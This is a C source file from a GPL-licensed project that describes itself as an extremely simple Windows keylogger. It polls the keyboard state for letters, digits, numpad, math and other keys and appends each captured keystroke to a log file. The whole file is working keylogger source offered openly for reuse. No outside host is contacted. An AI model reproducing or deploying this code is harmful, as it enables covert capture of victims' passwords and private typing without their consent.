/**
 Jade Logger - An extremely simple Windows keylogger
 Copyright (C) 2013  Adam Thompson <adam@nixgeeks.com>
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.
 
 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <windows.h>

#include "logger.h"
#include "keyboardLogger.h"

#define _WIN32_WINNT 0x0600

void logKeystrokes(FILE *logFile)
{
	char keyboardState[KEYBOARD_STATE_BUFFER];
	int success = GetKeyboardState((PBYTE) &keyboardState);
	
	if (success != 0)
	{
		logAlphabeticKeystrokes(logFile);
		logNumericKeystrokes(logFile, keyboardState);
		logStreamKeystrokes(logFile);
		logMathOpsKeystrokes(logFile);
		logOtherKeystrokes(logFile);
	}
}

void logAlphabeticKeystrokes(FILE *logFile)
{
	int capsLock = GetKeyState(VK_CAPITAL);
	int shift = GetAsyncKeyState(VK_SHIFT);
	int isCap = (shift == KEY_STATE_DOWN ? 1 : 0) ^ capsLock;
	int i;
	
	// Log pressed keys
	for (i= VK_A; i <= VK_Z; i++)
	{
		if (GetAsyncKeyState(i) & KEY_STATE_PRESSED)
		{
			int ascii = (isCap ? i : (i+32));
			jlog(logFile, "%c", ascii);
		}
	}
}

void logMathOpsKeystrokes(FILE *logFile)
{
	int i;
	
	for (i=0; i < NUM_VKS_MAT; i++)
	{
		if (GetAsyncKeyState(VKS_MATH[i]) & KEY_STATE_PRESSED)
			jlog(logFile, "%s", VKS_MATH_TXT[i]);
	}
}

void logNumericKeystrokes(FILE *logFile, char *keyboardState)
{
	int i;
	
	for (i=VK_0; i <= VK_9; i++)
	{
		if (GetAsyncKeyState(i) & KEY_STATE_PRESSED)
		{
			int scanCode = MapVirtualKey(i, 0);
			char asciiChar;
			
			if (ToAscii(i, scanCode, (BYTE *)keyboardState, (LPWORD) &asciiChar, 0) == 1)
				jlog(logFile, "%c", asciiChar);
		}
	}
	
	for (i=VK_NUMPAD0; i <= VK_NUMPAD9; i++)
	{
		if (GetAsyncKeyState(i) & KEY_STATE_PRESSED)
			jlog(logFile, "%01d", i - VK_NUMPAD0);
	}
}

void logOtherKeystrokes(FILE *logFile)
{
	int i;
	
	for (i=0; i < NUM_VKS_OTHER; i++)
	{
		if (GetAsyncKeyState(VKS_OTHER[i]) & KEY_STATE_PRESSED)
			jlog(logFile, "%s", VKS_OTHER_TXT[i]);
	}
}

void logStreamKeystrokes(FILE *logFile)
{
	int i;
	
	for (i=0; i < NUM_VKS_TXT_STREAM; i++)
	{
		if (GetAsyncKeyState(VKS_ALTER_TXT_STREAM[i]) & KEY_STATE_PRESSED)
			jlog(logFile, "\n%s", VKS_ALTER_TXT_STREAM_TXT[i]);
	}
}